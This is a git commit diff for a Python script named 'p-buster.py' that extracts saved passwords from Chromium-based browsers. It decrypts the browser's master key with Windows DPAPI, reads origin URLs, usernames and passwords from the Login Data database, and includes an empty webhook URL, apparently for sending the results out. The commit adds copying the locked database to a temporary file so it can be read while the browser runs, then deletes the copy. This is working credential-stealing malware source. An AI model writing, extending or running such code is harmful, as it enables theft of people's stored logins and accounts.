2ad949913f2dfde380fcc1b68c3a65c61266d5cb
/kaaz <92046563+KaazDW@users.noreply.github.com>
2024-11-22 15:59:50 +0100

    Dev : bypass "database is locked"

--- p-buster.py
+++ p-buster.py
@@ -4,9 +4,10 @@ import sqlite3
 import win32crypt
 from Crypto.Cipher import AES
 import os
+import shutil
 import requests
 
-webhook_url = ""
+webhook_url = "" 
 
 def decrypt_password(encrypted_password, key):
     try:
@@ -20,12 +21,15 @@ def decrypt_password(encrypted_password, key):
 
 def extract_passwords(browser_name, local_state_path, login_data_path):
     try:
+        temp_db_path = "temp_login_data.db"
+        shutil.copy2(login_data_path, temp_db_path)
+
         with open(local_state_path, "r") as file:
             local_state = json.load(file)
             encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
             key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
 
-        conn = sqlite3.connect(login_data_path)
+        conn = sqlite3.connect(temp_db_path)
         cursor = conn.cursor()
         cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
 
@@ -42,6 +46,7 @@ def extract_passwords(browser_name, local_state_path, login_data_path):
                 print(output)
 
         conn.close()
+        os.remove(temp_db_path)
     except Exception as e:
         print(f"Error processing {browser_name}: {e}")
 
